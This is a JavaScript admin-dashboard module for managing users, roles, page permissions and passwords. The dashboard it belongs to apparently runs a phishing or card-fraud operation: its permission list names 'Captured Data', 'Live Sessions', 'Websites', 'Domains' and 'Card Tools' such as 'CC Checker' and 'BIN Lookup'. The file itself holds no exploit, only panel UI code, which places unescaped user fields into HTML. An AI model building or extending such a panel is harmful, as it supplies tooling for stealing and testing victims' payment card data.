/**
 * User Management Page — god role only
 * Full control over all users: create, edit role, set page permissions, reset password, delete.
 */
const UserManagementPage = (() => {

  const PAGE_FEATURES = [
    { key: 'dashboard',      label: 'Dashboard',      section: 'Monitoring' },
    { key: 'sessions',       label: 'Live Sessions',  section: 'Monitoring' },
    { key: 'demo-pages',     label: 'Websites',       section: 'Control'    },
    { key: 'captured-data',  label: 'Captured Data',  section: 'Control'    },
    { key: 'analytics',      label: 'Analytics',      section: 'Control'    },
    { key: 'domains',        label: 'Domains',        section: 'Control'    },
    { key: 'bin-lookup',     label: 'BIN Lookup',     section: 'Card Tools' },
    { key: 'cc-checker',     label: 'CC Checker',     section: 'Card Tools' },
    { key: 'ip-blocking',    label: 'IP Blocking',    section: 'Security'   },
    { key: 'rate-limits',    label: 'Rate Limits',    section: 'Security'   },
    { key: 'firewall-rules', label: 'Firewall',       section: 'Security'   },
    { key: 'notifications',  label: 'Notifications',  section: 'System'     },
    { key: 'logs',           label: 'Audit Logs',     section: 'System'     },
    { key: 'settings',       label: 'Settings',       section: 'System'     },
  ];

  const ROLE_META = {
    god:         { label: 'God Admin',   cls: 'badge-warning',   icon: '👑', style: 'color:#D4AF37;border-color:rgba(212,175,55,0.3);background:rgba(212,175,55,0.1);' },
    super_admin: { label: 'Super Admin', cls: 'badge-info',      icon: '⭐', style: '' },
    admin:       { label: 'Admin',       cls: 'badge-success',   icon: '🔧', style: '' },
    viewer:      { label: 'Viewer',      cls: 'badge-secondary', icon: '👁', style: '' },
  };

  let _users = [];
  let _editingId = null;

  // ─── render ───────────────────────────────────────────────────────────────────

  function render() {
    return `
      <div class="page-header-row" style="display:flex;align-items:center;justify-content:space-between;margin-bottom:24px;flex-wrap:wrap;gap:12px;">
        <div>
          <h1 style="font-size:22px;font-weight:800;margin:0;">User Management</h1>
          <p style="color:var(--text-secondary);font-size:13px;margin:4px 0 0;">
            Manage users, assign roles, and control which sections each user can access.
            Permission changes take effect on the user's next login.
          </p>
        </div>
        <button class="btn btn-primary" id="um-add-btn" style="display:flex;align-items:center;gap:8px;">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
          Add User
        </button>
      </div>

      <div class="card" style="padding:0;overflow:hidden;">
        <div id="um-table-wrap">
          <div style="padding:48px;text-align:center;color:var(--text-secondary);">
            <div class="spinner" style="margin:0 auto 12px;"></div>
            Loading users…
          </div>
        </div>
      </div>

      <!-- Edit panel (hidden by default) -->
      <div id="um-edit-panel" style="display:none;" class="card" style="margin-top:20px;"></div>
    `;
  }

  // ─── init ─────────────────────────────────────────────────────────────────────

  async function init() {
    document.getElementById('um-add-btn').addEventListener('click', openCreateModal);
    await loadUsers();
  }

  async function loadUsers() {
    try {
      const { users } = await window.ALPApi.godGetUsers();
      _users = users;
      renderTable(users);
    } catch (err) {
      document.getElementById('um-table-wrap').innerHTML =
        `<div style="padding:32px;text-align:center;color:var(--danger);">Failed to load users: ${err.message}</div>`;
    }
  }

  // ─── table ────────────────────────────────────────────────────────────────────

  function renderTable(users) {
    const me = window.ALPAuth.getUser();

    const rows = users.map(u => {
      const rm = ROLE_META[u.role] || ROLE_META.viewer;
      const isSelf = u.id == me.userId;
      const isGodUser = u.role === 'god';
      const avatar = `<div style="width:32px;height:32px;border-radius:50%;background:${u.avatar_color};display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;color:#fff;flex-shrink:0;">${(u.username || '?')[0].toUpperCase()}</div>`;

      const pageCount = PAGE_FEATURES.length;
      const permsPages = (u.permissions && u.permissions.pages) || {};
      const blockedCount = PAGE_FEATURES.filter(f => permsPages[f.key] === false).length;
      const accessBadge = isGodUser
        ? `<span style="font-size:11px;color:#D4AF37;">Full access</span>`
        : blockedCount === 0
          ? `<span style="font-size:11px;color:var(--success);">All ${pageCount} pages</span>`
          : `<span style="font-size:11px;color:var(--warning);">${pageCount - blockedCount}/${pageCount} pages</span>`;

      return `
        <tr data-user-id="${u.id}">
          <td style="padding:12px 16px;">
            <div style="display:flex;align-items:center;gap:10px;">
              ${avatar}
              <div>
                <div style="font-weight:600;font-size:13px;">${u.username}${isSelf ? ' <span style="font-size:10px;color:var(--text-secondary);">(you)</span>' : ''}</div>
                <div style="font-size:11px;color:var(--text-secondary);">${u.email}</div>
              </div>
            </div>
          </td>
          <td style="padding:12px 16px;">
            <span class="badge ${rm.cls}" style="font-size:11px;${rm.style}">${rm.icon} ${rm.label}</span>
          </td>
          <td style="padding:12px 16px;">${accessBadge}</td>
          <td style="padding:12px 16px;color:var(--text-secondary);font-size:12px;">
            ${u.last_login ? new Date(u.last_login).toLocaleDateString() : 'Never'}
          </td>
          <td style="padding:12px 16px;text-align:right;">
            ${!isGodUser ? `
              <button class="btn btn-sm btn-ghost" onclick="UserManagementPage._openEdit(${u.id})" title="Edit user">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M11 4H4a2 2 0 00-2 2v14a2 2 0 002 2h14a2 2 0 002-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 013 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>
                Edit
              </button>
              ${!isSelf ? `
              <button class="btn btn-sm btn-ghost" style="color:var(--danger);" onclick="UserManagementPage._confirmDelete(${u.id})" title="Delete user">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 01-2 2H8a2 2 0 01-2-2L5 6"/><path d="M10 11v6M14 11v6"/><path d="M9 6V4h6v2"/></svg>
                Delete
              </button>` : ''}
            ` : `<span style="font-size:11px;color:var(--text-secondary);">Protected</span>`}
          </td>
        </tr>
      `;
    }).join('');

    document.getElementById('um-table-wrap').innerHTML = `
      <table style="width:100%;border-collapse:collapse;">
        <thead>
          <tr style="border-bottom:1px solid var(--border);">
            <th style="padding:10px 16px;text-align:left;font-size:11px;font-weight:600;color:var(--text-secondary);text-transform:uppercase;letter-spacing:.5px;">User</th>
            <th style="padding:10px 16px;text-align:left;font-size:11px;font-weight:600;color:var(--text-secondary);text-transform:uppercase;letter-spacing:.5px;">Role</th>
            <th style="padding:10px 16px;text-align:left;font-size:11px;font-weight:600;color:var(--text-secondary);text-transform:uppercase;letter-spacing:.5px;">Page Access</th>
            <th style="padding:10px 16px;text-align:left;font-size:11px;font-weight:600;color:var(--text-secondary);text-transform:uppercase;letter-spacing:.5px;">Last Login</th>
            <th style="padding:10px 16px;"></th>
          </tr>
        </thead>
        <tbody>${rows || '<tr><td colspan="5" style="padding:32px;text-align:center;color:var(--text-secondary);">No users found</td></tr>'}</tbody>
      </table>
    `;
  }

  // ─── edit panel ───────────────────────────────────────────────────────────────

  function _openEdit(userId) {
    _editingId = userId;
    const user = _users.find(u => u.id == userId);
    if (!user) return;

    const panel = document.getElementById('um-edit-panel');
    panel.style.display = 'block';
    panel.style.marginTop = '20px';
    panel.style.padding = '24px';

    const permsPages = (user.permissions && user.permissions.pages) || {};

    // Group features by section
    const sections = {};
    PAGE_FEATURES.forEach(f => {
      if (!sections[f.section]) sections[f.section] = [];
      sections[f.section].push(f);
    });

    const sectionHtml = Object.entries(sections).map(([sec, features]) => `
      <div style="margin-bottom:16px;">
        <div style="font-size:11px;font-weight:700;color:var(--text-secondary);text-transform:uppercase;letter-spacing:.5px;margin-bottom:8px;">${sec}</div>
        <div style="display:flex;flex-wrap:wrap;gap:8px;">
          ${features.map(f => {
            const checked = permsPages[f.key] !== false;
            return `
              <label style="display:flex;align-items:center;gap:6px;cursor:pointer;background:var(--bg-card-hover);padding:6px 10px;border-radius:6px;border:1px solid var(--border);font-size:12px;">
                <input type="checkbox" id="perm-${f.key}" ${checked ? 'checked' : ''} style="accent-color:var(--primary);cursor:pointer;">
                ${f.label}
              </label>
            `;
          }).join('')}
        </div>
      </div>
    `).join('');

    panel.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:20px;">
        <h3 style="margin:0;font-size:16px;font-weight:700;">
          Edit: <span style="color:var(--primary);">${user.username}</span>
        </h3>
        <button class="btn btn-sm btn-ghost" onclick="UserManagementPage._closeEdit()">✕ Close</button>
      </div>

      <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-bottom:20px;">
        <div>
          <label style="display:block;font-size:12px;font-weight:600;margin-bottom:6px;color:var(--text-secondary);">ROLE</label>
          <select id="um-role-select" class="form-input" style="width:100%;">
            <option value="viewer"      ${user.role==='viewer'      ? 'selected':''}>👁 Viewer</option>
            <option value="admin"       ${user.role==='admin'       ? 'selected':''}>🔧 Admin</option>
            <option value="super_admin" ${user.role==='super_admin' ? 'selected':''}>⭐ Super Admin</option>
          </select>
        </div>
        <div>
          <label style="display:block;font-size:12px;font-weight:600;margin-bottom:6px;color:var(--text-secondary);">RESET PASSWORD <span style="font-weight:400;">(leave blank to skip)</span></label>
          <input type="password" id="um-password" class="form-input" placeholder="New password…" style="width:100%;">
        </div>
      </div>

      <div style="margin-bottom:20px;">
        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px;">
          <label style="font-size:12px;font-weight:600;color:var(--text-secondary);">PAGE ACCESS PERMISSIONS</label>
          <div style="display:flex;gap:8px;">
            <button class="btn btn-sm btn-ghost" onclick="UserManagementPage._setAllPerms(true)" style="font-size:11px;">Enable All</button>
            <button class="btn btn-sm btn-ghost" onclick="UserManagementPage._setAllPerms(false)" style="font-size:11px;">Disable All</button>
          </div>
        </div>
        ${sectionHtml}
      </div>

      <div style="display:flex;justify-content:flex-end;gap:10px;">
        <button class="btn btn-ghost" onclick="UserManagementPage._closeEdit()">Cancel</button>
        <button class="btn btn-primary" id="um-save-btn" onclick="UserManagementPage._saveEdit()">
          Save Changes
        </button>
      </div>
    `;

    panel.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
  }

  function _closeEdit() {
    _editingId = null;
    const panel = document.getElementById('um-edit-panel');
    if (panel) panel.style.display = 'none';
  }

  function _setAllPerms(enabled) {
    PAGE_FEATURES.forEach(f => {
      const cb = document.getElementById(`perm-${f.key}`);
      if (cb) cb.checked = enabled;
    });
  }

  async function _saveEdit() {
    if (!_editingId) return;
    const btn = document.getElementById('um-save-btn');
    btn.disabled = true;
    btn.textContent = 'Saving…';

    try {
      const role = document.getElementById('um-role-select').value;
      const password = document.getElementById('um-password').value.trim();

      const pages = {};
      PAGE_FEATURES.forEach(f => {
        const cb = document.getElementById(`perm-${f.key}`);
        if (cb && !cb.checked) pages[f.key] = false;
      });
      const permissions = { pages };

      const payload = { role, permissions };
      if (password) payload.password = password;

      await window.ALPApi.godUpdateUser(_editingId, payload);
      window.showToast('User updated successfully', 'success');
      _closeEdit();
      await loadUsers();
    } catch (err) {
      window.showToast(err.message || 'Failed to update user', 'error');
    } finally {
      if (btn) { btn.disabled = false; btn.textContent = 'Save Changes'; }
    }
  }

  // ─── delete ───────────────────────────────────────────────────────────────────

  function _confirmDelete(userId) {
    const user = _users.find(u => u.id == userId);
    if (!user) return;

    window.showModal({
      title: 'Delete User',
      message: `Delete <strong>${user.username}</strong> (${user.email})? This cannot be undone.`,
      confirmText: 'Delete',
      confirmClass: 'btn-danger',
      onConfirm: async () => {
        try {
          await window.ALPApi.godDeleteUser(userId);
          window.showToast(`${user.username} deleted`, 'success');
          if (_editingId == userId) _closeEdit();
          await loadUsers();
        } catch (err) {
          window.showToast(err.message || 'Failed to delete user', 'error');
        }
      }
    });
  }

  // ─── create modal ─────────────────────────────────────────────────────────────

  function openCreateModal() {
    window.showModal({
      title: 'Add User',
      html: `
        <div style="display:flex;flex-direction:column;gap:14px;">
          <div>
            <label style="display:block;font-size:12px;font-weight:600;margin-bottom:5px;color:var(--text-secondary);">USERNAME</label>
            <input id="nc-username" class="form-input" style="width:100%;" placeholder="username">
          </div>
          <div>
            <label style="display:block;font-size:12px;font-weight:600;margin-bottom:5px;color:var(--text-secondary);">EMAIL</label>
            <input id="nc-email" class="form-input" type="email" style="width:100%;" placeholder="user@example.com">
          </div>
          <div>
            <label style="display:block;font-size:12px;font-weight:600;margin-bottom:5px;color:var(--text-secondary);">PASSWORD</label>
            <input id="nc-password" class="form-input" type="password" style="width:100%;" placeholder="Min. 6 characters">
          </div>
          <div>
            <label style="display:block;font-size:12px;font-weight:600;margin-bottom:5px;color:var(--text-secondary);">ROLE</label>
            <select id="nc-role" class="form-input" style="width:100%;">
              <option value="viewer">👁 Viewer</option>
              <option value="admin">🔧 Admin</option>
              <option value="super_admin">⭐ Super Admin</option>
            </select>
          </div>
        </div>
      `,
      confirmText: 'Create User',
      onConfirm: async () => {
        const username = document.getElementById('nc-username').value.trim();
        const email    = document.getElementById('nc-email').value.trim();
        const password = document.getElementById('nc-password').value;
        const role     = document.getElementById('nc-role').value;

        if (!username || !email || !password) {
          window.showToast('All fields are required', 'error');
          return false; // keep modal open
        }
        if (password.length < 6) {
          window.showToast('Password must be at least 6 characters', 'error');
          return false;
        }

        try {
          await window.ALPApi.godCreateUser({ username, email, password, role });
          window.showToast(`User "${username}" created`, 'success');
          await loadUsers();
        } catch (err) {
          window.showToast(err.message || 'Failed to create user', 'error');
          return false;
        }
      }
    });
  }

  function destroy() {
    _editingId = null;
    _users = [];
  }

  return {
    render,
    init,
    destroy,
    _openEdit,
    _closeEdit,
    _setAllPerms,
    _saveEdit,
    _confirmDelete,
  };
})();

window.UserManagementPage = UserManagementPage;
